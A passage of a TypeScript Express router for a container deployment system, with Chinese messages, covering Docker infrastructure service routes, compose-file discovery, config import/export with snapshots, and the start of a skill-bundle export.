        routingRules: [],
        buildProfiles: [],
        branches: {},
        nextPortIndex: 0,
        logs: {},
        defaultBranch: null,
        customEnv: { _global: {} },
        infraServices: [],
      };
      Object.assign(state, freshState);
      stateService.save();

      sendSSE(res, 'complete', {
        message: `已恢复出厂设置：清除 ${branches.length} 个分支、${state.infraServices.length} 个基础设施服务、所有配置。Docker 数据卷已保留。`,
      });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Compose-based infrastructure service discovery ──

  /**
   * Convert a ComposeServiceDef to an InfraService (allocating a host port).
   * PR_B.1：projectId 改为必填，所有 caller 必须显式传入。
   */
  function composeDefToInfraService(def: ComposeServiceDef, projectId: string): InfraService {
    const hostPort = stateService.allocatePort(config.portStart);
    return {
      id: def.id,
      projectId,
      name: def.name,
      dockerImage: def.dockerImage,
      containerPort: def.containerPort,
      hostPort,
      containerName: `cds-infra-${def.id}`,
      status: 'stopped',
      volumes: [...def.volumes],
      env: { ...def.env },
      healthCheck: def.healthCheck ? { ...def.healthCheck } : undefined,
      createdAt: new Date().toISOString(),
    };
  }

  // ── Infrastructure services CRUD ──

  router.get('/infra', async (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const services = projectFilter
      ? stateService.getInfraServicesForProject(projectFilter)
      : stateService.getInfraServices();

    // Reconcile status with Docker
    for (const svc of services) {
      if (svc.status === 'running') {
        const running = await containerService.isRunning(svc.containerName);
        if (!running) {
          svc.status = 'stopped';
        }
      }
    }
    stateService.save();

    res.json({ services });
  });

  // Discover infrastructure services from compose files in the project repo
  router.get('/infra/discover', (req, res) => {
    try {
      // Scope discovery to the current project's own repo root only.
      // Using config.repoRoot (the CDS host directory) would expose compose
      // files belonging to other projects.
      const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
      const effectiveProjectId = queryProject || 'default';
      const scanRoot = stateService.getProjectRepoRoot(effectiveProjectId, config.repoRoot);

      const composeFiles = discoverComposeFiles(scanRoot);
      const discovered: { file: string; services: ComposeServiceDef[] }[] = [];

      for (const file of composeFiles) {
        try {
          const services = parseComposeFile(file);
          if (services.length > 0) {
            discovered.push({ file: path.relative(scanRoot, file), services });
          }
        } catch { /* skip unparseable files */ }
      }

      res.json({ discovered });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  /**
   * Resolve the project context for /infra/:id routes.
   *
   * Reads ?project=<id> from the query string first. If absent, and the
   * global lookup of `id` yields exactly one match, uses that match's
   * projectId (back-compat for clients that don't know about projects).
   * If the global lookup yields multiple matches across projects,
   * returns null so the caller can 400 with a clear "which project?"
   * message instead of silently operating on the wrong one.
   */
  function resolveInfraProject(req: Request, id: string): { projectId: string } | { ambiguous: string[] } | null {
    const q = typeof req.query.project === 'string' ? req.query.project : null;
    if (q) return { projectId: q };
    const all = stateService.getInfraServices().filter(s => s.id === id);
    if (all.length === 0) return null;
    if (all.length === 1) return { projectId: all[0].projectId || 'default' };
    return { ambiguous: all.map(s => s.projectId || 'default') };
  }

  router.post('/infra', async (req, res) => {
    try {
      const body = req.body as Partial<InfraService>;

      if (!body.id || !body.dockerImage || !body.containerPort) {
        res.status(400).json({ error: 'id、Docker 镜像和容器端口为必填项' });
        return;
      }
      const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
      const projectId = body.projectId || queryProject || 'default';
      const targetProject = stateService.getProject(projectId);
      if (!targetProject) {
        res.status(400).json({ error: `未知项目: ${projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      const hostPort = stateService.allocatePort(config.portStart);
      // Container name must be globally unique in Docker. Legacy project
      // keeps the bare `cds-infra-<id>` format for back-compat (existing
      // running containers match). Non-legacy projects get the project
      // slug head prefixed so two projects can each own `mongodb`.
      const containerName = targetProject.legacyFlag
        ? `cds-infra-${body.id}`
        : `cds-infra-${targetProject.slug.slice(0, 12)}-${body.id}`;
      const service: InfraService = {
        id: body.id,
        projectId,
        name: body.name || body.id,
        dockerImage: body.dockerImage,
        containerPort: body.containerPort,
        hostPort,
        containerName,
        status: 'stopped',
        volumes: body.volumes || [],
        env: body.env || {},
        healthCheck: body.healthCheck,
        createdAt: new Date().toISOString(),
      };

      stateService.addInfraService(service);
      stateService.save();

      res.status(201).json({ service });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/infra/:id', (req, res) => {
    try {
      const updates = req.body as Partial<InfraService>;
      const resolved = resolveInfraProject(req, req.params.id);
      if (!resolved) { res.status(404).json({ error: `基础设施服务 "${req.params.id}" 不存在` }); return; }
      if ('ambiguous' in resolved) {
        res.status(400).json({ error: `基础设施服务 "${req.params.id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, resolved.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.updateInfraService(req.params.id, updates, resolved.projectId);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/infra/:id', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      try { await containerService.stopInfraService(service.containerName); } catch { /* ok */ }
      stateService.removeInfraService(id, resolved.projectId);
      stateService.save();
      res.json({ message: `已删除基础设施服务 "${id}"` });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/start', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      const started = await startInfraWithPortRetry(service, resolved.projectId);
      stateService.updateInfraService(id, { hostPort: started.hostPort, status: 'running', errorMessage: undefined }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已启动`, service: stateService.getInfraServiceForProjectAndId(resolved.projectId, id) });
    } catch (err) {
      stateService.updateInfraService(id, { status: 'error', errorMessage: (err as Error).message }, resolved.projectId);
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/stop', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      await containerService.stopInfraService(service.containerName);
      stateService.updateInfraService(id, { status: 'stopped' }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已停止` });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/restart', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      try { await containerService.stopInfraService(service.containerName); } catch { /* ok */ }
      const started = await startInfraWithPortRetry(service, resolved.projectId);
      stateService.updateInfraService(id, { hostPort: started.hostPort, status: 'running', errorMessage: undefined }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已重启`, service: stateService.getInfraServiceForProjectAndId(resolved.projectId, id) });
    } catch (err) {
      stateService.updateInfraService(id, { status: 'error', errorMessage: (err as Error).message }, resolved.projectId);
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/infra/:id/logs', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      const logs = await containerService.getLogs(service.containerName);
      res.json({ logs });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/infra/:id/health', async (req, res) => {
    const { id } = req.params;
    const service = stateService.getInfraService(id);
    if (!service) {
      res.status(404).json({ error: `基础设施服务 "${id}" 不存在` });
      return;
    }
    try {
      const health = await containerService.getInfraHealth(service.containerName);
      res.json({ health });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // Quick setup: discover infra from compose files and start them
  router.post('/infra/quickstart', async (req, res) => {
    const { compose: composeYaml, serviceIds } = req.body as { compose?: string; serviceIds?: string[] };
    const results: { id: string; status: string; error?: string }[] = [];

    // PR_B.1：projectId 提到外层使 composeDefToInfraService(def, effectiveProjectId)
    // 在 for 循环里能访问到。两个分支（compose 和 auto-discover）都需要它。
    const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
    const bodyProject = typeof req.body.projectId === 'string' ? req.body.projectId : null;
    const effectiveProjectId =
      queryProject || bodyProject || stateService.getLegacyProject()?.id || 'default';

    // Resolve service definitions: from inline compose YAML, or auto-discover from repo
    let defs: ComposeServiceDef[] = [];
    if (composeYaml) {
      defs = parseComposeString(composeYaml);
    } else {
      // Scope discovery to the current project's repo root only.
      // Using config.repoRoot (the shared CDS host dir) would expose compose
      // files from other projects — same isolation fix as /infra/discover.
      const scanRoot = stateService.getProjectRepoRoot(effectiveProjectId, config.repoRoot);
      const composeFiles = discoverComposeFiles(scanRoot);
      const seenIds = new Set<string>();
      for (const file of composeFiles) {
        try {
          for (const def of parseComposeFile(file)) {
            if (!seenIds.has(def.id)) {
              seenIds.add(def.id);
              defs.push(def);
            }
          }
        } catch { /* skip */ }
      }
    }

    // Filter by requested IDs if specified
    if (serviceIds && serviceIds.length > 0) {
      defs = defs.filter(d => serviceIds.includes(d.id));
    }

    if (defs.length === 0) {
      res.json({ results: [], message: '未找到基础设施服务定义。请在项目中添加 docker-compose.yml 或 cds-compose.yml 文件。' });
      return;
    }

    for (const def of defs) {
      // Skip if already exists
      if (stateService.getInfraService(def.id)) {
        results.push({ id: def.id, status: 'exists' });
        continue;
      }

      const service = composeDefToInfraService(def, effectiveProjectId);

      try {
        stateService.addInfraService(service);
        // Phase 1: 传项目 customEnv 让 ${VAR} 展开
        await containerService.startInfraService(service, stateService.getCustomEnv(effectiveProjectId));
        stateService.updateInfraService(service.id, { status: 'running' });
        results.push({ id: service.id, status: 'started' });
      } catch (err) {
        stateService.updateInfraService(service.id, { status: 'error', errorMessage: (err as Error).message });
        results.push({ id: service.id, status: 'error', error: (err as Error).message });
      }
    }

    stateService.save();
    res.json({ results });
  });

  // ── Config Import / Export ──

  /** Validate a CDS Config JSON blob */
  function validateConfigBlob(blob: unknown): { valid: boolean; errors: string[]; warnings: string[] } {
    const errors: string[] = [];
    const warnings: string[] = [];
    if (!blob || typeof blob !== 'object') {
      return { valid: false, errors: ['配置必须是一个 JSON 对象'], warnings };
    }
    const cfg = blob as Record<string, unknown>;
    const schema = cfg.$schema as string | undefined;
    if (schema && schema !== 'cds-config') {
      errors.push('$schema 字段值应为 "cds-config"');
    }
    // Validate buildProfiles
    if (cfg.buildProfiles !== undefined) {
      if (!Array.isArray(cfg.buildProfiles)) {
        errors.push('buildProfiles 必须是数组');
      } else {
        for (let i = 0; i < cfg.buildProfiles.length; i++) {
          const p = cfg.buildProfiles[i] as Record<string, unknown>;
          if (!p.id) errors.push(`buildProfiles[${i}]: 缺少 id`);
          if (!p.name) errors.push(`buildProfiles[${i}]: 缺少 name`);
          if (!p.dockerImage) errors.push(`buildProfiles[${i}]: 缺少 dockerImage`);
          if (!p.command) errors.push(`buildProfiles[${i}]: 缺少 command`);
          if (p.containerPort !== undefined) {
            const port = Number(p.containerPort);
            if (!Number.isInteger(port) || port < 1 || port > 65535) {
              errors.push(`buildProfiles[${i}]: containerPort 必须在 1-65535 之间`);
            }
          }
          // Check corepack prefix for pnpm/yarn commands
          const label = `buildProfiles[${i}]`;
          const cmdWarn = checkCorepackPrefix(p.command as string | undefined, `${label}.command`);
          if (cmdWarn) warnings.push(cmdWarn);

          // Cross-check: if workDir has a lock file that doesn't match the command's PM
          if (p.workDir && typeof p.workDir === 'string') {
            const fullDir = path.join(config.repoRoot, p.workDir);
            if (fs.existsSync(fullDir)) {
              const detectedPm = detectPackageManager(fullDir);
              const cmdToCheck = (p.command as string) || '';
              const usesWrongPm =
                (detectedPm === 'pnpm' && /\bnpm install\b/.test(cmdToCheck)) ||
                (detectedPm === 'npm' && /\bpnpm install\b/.test(cmdToCheck)) ||
                (detectedPm === 'yarn' && !/\byarn install\b/.test(cmdToCheck) && /\b(npm|pnpm) install\b/.test(cmdToCheck));
              if (usesWrongPm) {
                warnings.push(`${label}: 检测到 ${p.workDir}/ 使用 ${detectedPm}，但命令使用了其他包管理器`);
              }
            }
          }
        }
      }
    }
    // Validate envVars
    if (cfg.envVars !== undefined && (typeof cfg.envVars !== 'object' || Array.isArray(cfg.envVars))) {
      errors.push('envVars 必须是键值对对象');
    }
    // Validate infraServices — accepts array of full definitions OR a compose YAML string
    if (cfg.infraServices !== undefined) {
      if (typeof cfg.infraServices === 'string') {
        // Compose YAML string — validate it parses
        try {
          const defs = parseComposeString(cfg.infraServices as string);
          if (defs.length === 0) {
            warnings.push('infraServices (compose YAML): 未解析到任何服务');
          }
        } catch (e) {
          errors.push(`infraServices (compose YAML): 解析失败 — ${(e as Error).message}`);
        }
      } else if (Array.isArray(cfg.infraServices)) {
        for (let i = 0; i < cfg.infraServices.length; i++) {
          const s = cfg.infraServices[i] as Record<string, unknown>;
          if (!s.id) {
            errors.push(`infraServices[${i}]: 缺少 id`);
          }
          if (!s.dockerImage && !s.image) {
            errors.push(`infraServices[${i}]: 缺少 dockerImage`);
          }
          if (!s.containerPort) {
            errors.push(`infraServices[${i}]: 缺少 containerPort`);
          }
        }
      } else {
        errors.push('infraServices 必须是数组或 compose YAML 字符串');
      }
    }
    // Validate routingRules
    if (cfg.routingRules !== undefined) {
      if (!Array.isArray(cfg.routingRules)) {
        errors.push('routingRules 必须是数组');
      }
    }
    return { valid: errors.length === 0, errors, warnings };
  }

  /** Resolve infraServices from config — supports array of full defs or compose YAML string */
  function resolveInfraDefs(cfg: Record<string, unknown>): ComposeServiceDef[] {
    if (!cfg.infraServices) return [];

    if (typeof cfg.infraServices === 'string') {
      return parseComposeString(cfg.infraServices as string);
    }

    if (Array.isArray(cfg.infraServices)) {
      return (cfg.infraServices as Array<Record<string, unknown>>).map(s => ({
        id: (s.id as string) || '',
        name: (s.name as string) || (s.id as string) || '',
        dockerImage: (s.dockerImage as string) || (s.image as string) || '',
        containerPort: (s.containerPort as number) || 0,
        volumes: (s.volumes as Array<{ name: string; containerPath: string }>) || [],
        env: (s.env as Record<string, string>) || {},
        healthCheck: s.healthCheck as ComposeServiceDef['healthCheck'],
      }));
    }

    return [];
  }

  /** Preview what an import would do (without applying) */
  function previewImport(cfg: Record<string, unknown>) {
    const summary = {
      buildProfiles: { add: 0, replace: 0, skip: 0, items: [] as string[] },
      envVars: { add: 0, replace: 0, items: [] as string[] },
      infraServices: { add: 0, skip: 0, items: [] as string[] },
      routingRules: { add: 0, replace: 0, items: [] as string[] },
    };

    if (Array.isArray(cfg.buildProfiles)) {
      for (const p of cfg.buildProfiles as Array<{ id: string; name?: string }>) {
        const existing = stateService.getBuildProfile(p.id);
        if (existing) {
          summary.buildProfiles.replace++;
          summary.buildProfiles.items.push(`替换: ${p.name || p.id}`);
        } else {
          summary.buildProfiles.add++;
          summary.buildProfiles.items.push(`新增: ${p.name || p.id}`);
        }
      }
    }

    if (cfg.envVars && typeof cfg.envVars === 'object') {
      const currentEnv = stateService.getCustomEnv();
      for (const key of Object.keys(cfg.envVars as Record<string, string>)) {
        if (key in currentEnv) {
          summary.envVars.replace++;
          summary.envVars.items.push(`覆盖: ${key}`);
        } else {
          summary.envVars.add++;
          summary.envVars.items.push(`新增: ${key}`);
        }
      }
    }

    // Resolve infra services from array or compose YAML string
    const infraDefs = resolveInfraDefs(cfg);
    for (const def of infraDefs) {
      const existing = stateService.getInfraService(def.id);
      if (existing) {
        summary.infraServices.skip++;
        summary.infraServices.items.push(`跳过 (已存在): ${def.id}`);
      } else {
        summary.infraServices.add++;
        summary.infraServices.items.push(`新增: ${def.name || def.id}`);
      }
    }

    if (Array.isArray(cfg.routingRules)) {
      for (const r of cfg.routingRules as Array<{ id: string; name?: string }>) {
        const existing = stateService.getRoutingRules().find(x => x.id === r.id);
        if (existing) {
          summary.routingRules.replace++;
          summary.routingRules.items.push(`替换: ${r.name || r.id}`);
        } else {
          summary.routingRules.add++;
          summary.routingRules.items.push(`新增: ${r.name || r.id}`);
        }
      }
    }

    return summary;
  }

  // POST /api/import-config — validate, preview, and optionally apply
  //
  // 2026-04-22 升级：
  //   - 每次 apply 前自动拍 ConfigSnapshot（trigger='pre-import'）
  //   - 新增 cleanMode: 'merge' | 'replace-all'
  //       merge      = 原行为（新增/更新，不删除存量）
  //       replace-all = 清空 buildProfiles/envVars/infra/routingRules 后再 apply
  //   - 新增 branchPolicy: 'keep' | 'restart-all' | 'clean'
  //       keep        = 不动运行中的分支（默认）
  //       restart-all = apply 后调度重启所有分支容器（让新 env 生效）
  //       clean       = 额外清掉所有分支的运行状态（容器 + worktree），只留配置
  //
  // 数据库永不在清理范围内。想清数据库走 /api/infra/:id/purge。
  router.post('/import-config', async (req, res) => {
    try {
      const {
        config: configBlob,
        dryRun,
        cleanMode = 'merge',
        branchPolicy = 'keep',
      } = req.body as {
        config: unknown;
        dryRun?: boolean;
        cleanMode?: 'merge' | 'replace-all';
        branchPolicy?: 'keep' | 'restart-all' | 'clean';
      };

      if (cleanMode !== 'merge' && cleanMode !== 'replace-all') {
        res.status(400).json({ error: `非法的 cleanMode: ${cleanMode}（允许 merge / replace-all）` });
        return;
      }
      if (!['keep', 'restart-all', 'clean'].includes(branchPolicy)) {
        res.status(400).json({ error: `非法的 branchPolicy: ${branchPolicy}（允许 keep / restart-all / clean）` });
        return;
      }

      // Auto-detect format: string → try CDS compose YAML, object → JSON config
      let cfg: Record<string, unknown>;
      if (typeof configBlob === 'string') {
        const cdsConfig = parseCdsCompose(configBlob);
        if (cdsConfig) {
          cfg = {
            $schema: 'cds-config',
            buildProfiles: cdsConfig.buildProfiles,
            envVars: cdsConfig.envVars,
            infraServices: cdsConfig.infraServices.length > 0 ? cdsConfig.infraServices : undefined,
            routingRules: cdsConfig.routingRules.length > 0 ? cdsConfig.routingRules : undefined,
          };
        } else {
          try {
            cfg = JSON.parse(configBlob);
          } catch {
            res.status(400).json({
              valid: false,
              errors: ['无法解析输入：既不是有效的 CDS Compose YAML（需包含 services 定义），也不是有效的 JSON'],
              warnings: [],
            });
            return;
          }
        }
      } else {
        cfg = configBlob as Record<string, unknown>;
      }

      const validation = validateConfigBlob(cfg);
      if (!validation.valid) {
        res.status(400).json({ valid: false, errors: validation.errors, warnings: validation.warnings });
        return;
      }
      const preview = previewImport(cfg);

      if (dryRun) {
        res.json({
          valid: true,
          preview,
          applied: false,
          warnings: validation.warnings,
          cleanMode,
          branchPolicy,
        });
        return;
      }

      // 1) 拍快照（replace-all 必须拍；merge 也默认拍，成本很低）
      const snapshotLabel = cleanMode === 'replace-all'
        ? `导入前（replace-all）· ${new Date().toLocaleString('zh-CN')}`
        : `导入前（merge）· ${new Date().toLocaleString('zh-CN')}`;
      const snapshot = stateService.createConfigSnapshot({
        trigger: 'pre-import',
        label: snapshotLabel,
      });

      // 2) replace-all 模式：清空四件套
      //    用「全部删除 + 逐个添加」方式，避免状态字段漂移
      if (cleanMode === 'replace-all') {
        // 清 buildProfiles
        for (const p of [...stateService.getBuildProfiles()]) {
          stateService.removeBuildProfile(p.id);
        }
        // 清 customEnv（所有 scope）
        stateService.clearAllCustomEnv();
        // 清 infraServices（但保留已创建的容器数据 —— 只是从 state 删记录）
        for (const svc of [...stateService.getInfraServices()]) {
          stateService.removeInfraService(svc.id);
        }
        // 清 routingRules
        for (const rule of [...stateService.getRoutingRules()]) {
          stateService.removeRoutingRule(rule.id);
        }
      }

      // 3) apply buildProfiles
      if (Array.isArray(cfg.buildProfiles)) {
        for (const p of cfg.buildProfiles as BuildProfile[]) {
          const existing = stateService.getBuildProfile(p.id);
          if (existing) {
            stateService.updateBuildProfile(p.id, p);
          } else {
            p.workDir = p.workDir || '.';
            p.containerPort = p.containerPort || 8080;
            stateService.addBuildProfile(p);
          }
        }
      }

      // 4) apply envVars
      if (cfg.envVars && typeof cfg.envVars === 'object') {
        const newVars = cfg.envVars as Record<string, string>;
        for (const [key, value] of Object.entries(newVars)) {
          stateService.setCustomEnvVar(key, value);
        }
      }

      // 5) apply infraServices
      // PR_B.1：/import-config 是历史全局端点没带 projectId — 兜底到 legacy
      // project，保证多项目时不变成孤儿。后续可在 body 加 projectId 字段。
      const importInfraProjectId =
        stateService.getLegacyProject()?.id ?? 'default';
      const infraResults: { id: string; status: string }[] = [];
      const infraDefs = resolveInfraDefs(cfg);
      for (const def of infraDefs) {
        if (stateService.getInfraService(def.id)) {
          infraResults.push({ id: def.id, status: 'exists' });
          continue;
        }
        if (def.id && def.dockerImage && def.containerPort) {
          const service = composeDefToInfraService(def, importInfraProjectId);
          stateService.addInfraService(service);
          infraResults.push({ id: service.id, status: 'created' });
        }
      }

      // 6) apply routingRules
      if (Array.isArray(cfg.routingRules)) {
        for (const r of cfg.routingRules as RoutingRule[]) {
          const existing = stateService.getRoutingRules().find(x => x.id === r.id);
          if (existing) {
            stateService.updateRoutingRule(r.id, r);
          } else {
            r.priority = r.priority ?? 0;
            r.enabled = r.enabled ?? true;
            stateService.addRoutingRule(r);
          }
        }
      }

      syncCdsConfig();
      stateService.save();

      // 7) branchPolicy: 只做调度侧的标记，真实 restart/clean 由调用方按返回提示触发（避免同步阻塞）
      const branchActions: string[] = [];
      if (branchPolicy !== 'keep') {
        const branches = stateService.getAllBranches();
        for (const b of branches) {
          branchActions.push(`${b.id}: ${branchPolicy === 'restart-all' ? '待重启' : '待清理'}`);
        }
      }

      // 8) replace-all 视为破坏性操作，记审计日志 + 关联 snapshotId
      if (cleanMode === 'replace-all') {
        stateService.recordDestructiveOp({
          type: 'import-replace-all',
          snapshotId: snapshot.id,
          summary: `replace-all 导入配置：清空 4 件套并重新导入（${(cfg.buildProfiles as BuildProfile[] | undefined)?.length ?? 0} 个 profile / ${infraDefs.length} 个 infra）`,
        });
      }

      res.json({
        valid: true,
        preview,
        applied: true,
        cleanMode,
        branchPolicy,
        infraResults,
        snapshotId: snapshot.id,
        snapshotLabel: snapshot.label,
        branchActions,
        warnings: validation.warnings,
        message: cleanMode === 'replace-all'
          ? '配置已清空并重新导入（快照已保存，可在「历史版本」一键回滚）'
          : '配置已合并导入（快照已保存，可在「历史版本」回滚）',
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // GET /api/export-config[?project=<id>] — export config as CDS Compose YAML.
  // FU-04 isolation sweep (2026-04-24): scope by ?project= so the YAML
  // only contains the requested project's profiles/infra/rules + that
  // project's env (_global baseline + project overrides). Without the
  // query param we keep legacy behaviour (everything globally) for
  // back-compat with existing tooling that calls it bare.
  router.get('/export-config', (req, res) => {
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const profiles = projectFilter
      ? stateService.getBuildProfilesForProject(projectFilter)
      : stateService.getBuildProfiles();
    const envVars = projectFilter
      ? stateService.getCustomEnv(projectFilter)
      : stateService.getCustomEnv();
    const infra = projectFilter
      ? stateService.getInfraServicesForProject(projectFilter)
      : stateService.getInfraServices();
    const rules = projectFilter
      ? stateService.getRoutingRulesForProject(projectFilter)
      : stateService.getRoutingRules();

    const yamlContent = toCdsCompose(profiles, envVars, infra, rules);
    res.type('text/yaml').send(yamlContent);
  });

  // GET /api/cli-version — return the currently-bundled cdscli VERSION
  //
  // 读 .claude/skills/cds/cli/cdscli.py 里的 `VERSION = "x.y.z"` 常量，
  // 每次被 cdscli update / cdscli version 调用时返回。解析结果缓存 60s
  // 避免每次都 read+regex（CLI 进程短命，主要让 Dashboard 轮询便宜）。
  let _cliVersionCache: { version: string | null; at: number } = { version: null, at: 0 };
  function readBundledCliVersion(): string | null {
    const now = Date.now();
    if (_cliVersionCache.version !== null && now - _cliVersionCache.at < 60_000) {
      return _cliVersionCache.version;
    }
    try {
      const cliPath = path.join(config.repoRoot, '.claude', 'skills', 'cds', 'cli', 'cdscli.py');
      if (!fs.existsSync(cliPath)) {
        _cliVersionCache = { version: null, at: now };
        return null;
      }
      const content = fs.readFileSync(cliPath, 'utf-8');
      // Anchor on VERSION = "..." at start of line to avoid catching
      // comments, test fixtures, or nested module vars. Only first match.
      const match = content.match(/^VERSION\s*=\s*"([^"]+)"/m);
      const version = match ? match[1] : null;
      _cliVersionCache = { version, at: now };
      return version;
    } catch {
      return null;
    }
  }
  router.get('/cli-version', (_req, res) => {
    const version = readBundledCliVersion();
    if (!version) {
      res.status(404).json({ error: '未找到 cdscli VERSION 常量' });
      return;
    }
    res.json({ version });
  });

  // GET /api/export-skill — export all CDS skills as a single tar.gz bundle
  //
  // 打包内容（全量，不分 legacy / unified）：
  //   .claude/skills/cds/                — 统一技能（主入口 + CLI + reference）
  //   .claude/skills/cds-deploy-pipeline/ — 部署流水线技能
  //   .claude/skills/cds-project-scan/   — 扫描技能（向后兼容旧工作流）
  //
  // 旧入参 `?legacy=1` 保留：仍能仅导出 cds-project-scan（向后兼容）。
  router.get('/export-skill', (req, res) => {
    try {
      const useLegacy = req.query.legacy === '1';

      // 解析 skills 根目录：优先 config.repoRoot，兜底父目录（CDS 部署为子目录时）
      const skillsRoot = ((): string => {
        const primary = path.join(config.repoRoot, '.claude', 'skills');
        if (fs.existsSync(primary)) return primary;
        const parent = path.join(config.repoRoot, '..', '.claude', 'skills');
        if (fs.existsSync(parent)) return parent;
        return primary; // 返回原路径，后续报错
      })();

      // Build pack in a temp directory
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
      const packName = useLegacy ? `cds-project-scan-skill-${timestamp}` : `cds-skills-${timestamp}`;
      const tmpDir = path.join(config.repoRoot, '.cds', 'tmp');
      const packDir = path.join(tmpDir, packName);

      const copyRecursive = (src: string, dst: string) => {
        const stat = fs.statSync(src);
        if (stat.isDirectory()) {
          fs.mkdirSync(dst, { recursive: true });
          for (const entry of fs.readdirSync(src)) {
            copyRecursive(path.join(src, entry), path.join(dst, entry));
          }
        } else {
          fs.copyFileSync(src, dst);
        }
      };

      // 要打包的技能列表
      const skillsToCopy: string[] = useLegacy
        ? ['cds-project-scan']
        : ['cds', 'cds-deploy-pipeline', 'cds-project-scan'];

      let copiedCount = 0;
      for (const skillName of skillsToCopy) {
        const skillDir = path.join(skillsRoot, skillName);
        if (!fs.existsSync(skillDir)) continue;
        const targetSkillDir = path.join(packDir, '.claude', 'skills', skillName);
        fs.mkdirSync(targetSkillDir, { recursive: true });
        copyRecursive(skillDir, targetSkillDir);
        copiedCount++;
      }

      if (copiedCount === 0) {
        res.status(404).json({ error: `未找到 CDS 技能目录（已查找：${skillsRoot}）` });
        return;
      }

      // README tailored to the new unified skill
      const readme = useLegacy
        ? `# CDS 部署技能包 (legacy: cds-project-scan)\n\n将 \`.claude/skills/cds-project-scan/\` 复制到目标项目的对应路径。\n`
        : `# CDS 技能包（全套，共 ${copiedCount} 个技能）

包含：cds（主技能）、cds-deploy-pipeline（部署流水线）、cds-project-scan（扫描）。
覆盖 CDS 全生命周期：扫描项目 → Agent 鉴权 → 部署 → 就绪检测 → 分层冒烟 → 故障诊断。

## 三分钟安装

\`\`\`bash
# 1. 解压到你项目的根目录（会在 .claude/skills/ 下放置所有 cds 技能）
tar -xzf ${packName}.tar.gz --strip-components=1

# 2. 加 alias（推荐）
echo 'alias cdscli="python3 \\$(git rev-parse --show-toplevel)/.claude/skills/cds/cli/cdscli.py"' >> ~/.bashrc
